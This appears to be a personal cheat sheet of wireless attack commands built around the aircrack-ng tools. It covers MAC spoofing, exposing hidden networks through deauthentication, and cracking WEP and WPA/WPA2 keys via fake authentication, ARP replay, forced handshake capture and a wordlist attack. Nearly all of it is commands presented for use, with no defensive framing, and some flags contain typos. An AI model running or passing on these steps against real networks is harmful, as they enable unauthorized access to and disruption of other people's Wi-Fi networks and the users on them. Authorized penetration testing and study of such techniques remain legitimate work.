DISABLE MAC ADDRESS RANDOMIZATION (MAY INTERFERE WITH SOME ATTACKS)
    1)  add the line:
            mac-address-randomization=0
        to all the files under  /etc/NetworkManager/system-connections in the [connection] section
    2) service network-manager restart




MAC SPOOFING:
    #disable mac address randomization
    1) get BSSID of the target AP
    2) drop interface ypou want to change:
        ifconfig wlan0 down
    3) macchanger -m <target mac address> wlan0
    4) ifconfig wlan0 up

LOOK FOR HIDDEN NETWORKS:
    1)  airmon-ng start wlan0
        //kill all the processes that could cause troubles 
    2)  airodump-ng wlan0mon
        //name indicated in the airmon-ng message
    3)  it will show a list of devices, the hidden ones show no essid or <lenght: 0> as essid
    4)  to find essid:
        - leave in a terminal the previous command to continue to check the info intercepted (also do a more specific command to not have too many info)
        -  execute deauth attack with aireplay:
            aireplay-ng -0 1 -a <bssid> wlan0mon
        -now essid should show up in airodump-ng terminal (like before but now it doesn't have zlenth 0> as essid but a real essid)

CRACKING WEP:
    #start monitor mode
    airmon-ng start wlan0                   //changes it to wlan0mon (kill the services that interfere with airmon)
    #look for the target AP
    airodump-ng wlan0mon
    #create dump file to capture IV (initialization vectors)
    airodump-ng -c 6 -w wepdump.cap -bssid 1C:DF:89:84:9F wlan0mon         //-c <channel> -w <output file name> -bssid <bssid> 
    #fake authentication attack (in another terminal while the other is capturing)
    aireplay-ng -1 0 -a 1C:DF:89:84:9F wlan0mon            //-1 = fake auth attack, 0 = delay, -a <bssid>
    #arp replay attack to increase traffic (need at least 15000 data in airodump-ng)
    aireplay-ng -3 -b 1C:DF:89:84:9F -wlan0mon
    #crack the key using the file from airdump-ng
    aircrack-ng wepdump.cap                    //it print something like [ F2:C7:BB:35:B9 ] the key is without braces and columns: F2C7BB35B9
    #set everything back to normal (close terminals and stop wlan0mon)
    airmon-ng stop wlan0mon
    service network-monitor start

CRACKING WPA/WPA2:
    #monitor mode 
    airmon-ng start wlan0
    #start monitoring to find target AP
    airodump-ng wlan0mon
    #create output file with captured packets
    airodump-ng -c 6 -w wpadump.cap -bssid 1C:DF:89:84:9F wlan0mon
    #wait for a four way handshake to happen (someone connects to the AP) or force it to happen with deauth attack
    aireplay-ng -0 2 -a 1C:DF:89:84:9F -c 1C:DF:8C:5D.... wlan0mon      //-c <client bssid yopu want to deauth>
    #in the aerodump-ng terminal now we can see the wpa handshake: 00:1C:DF:89:84:9F (it sgould be on top of the screen)
    #crack the key
    aircrack-ng -a2 -b 1C:DF:89:84:9F -w /usr/share/wordlists/rockyou.txt wpadump.cap       //-a2 = wpa2
